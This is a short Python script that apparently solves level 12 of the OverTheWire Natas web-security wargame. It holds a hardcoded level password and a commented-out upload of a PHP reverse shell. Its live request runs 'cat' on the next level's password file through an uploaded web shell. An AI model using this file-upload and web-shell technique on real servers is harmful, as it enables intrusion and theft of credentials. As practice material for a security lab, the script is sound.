#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#response = session.get(url, auth=(username, password))
#response = session.post(url, files = {"uploadedfile" : open('revshell.php', 'rb')},data = {"filename":"revshell.php", "MAX_FILE_SIZE" : "1000"}, auth = (username, password))
response = session.get(url + 'upload/ltnw8gq53g.php?c=cat /etc/natas_webpass/natas13', auth = (username, password))


content = response.text
print(content)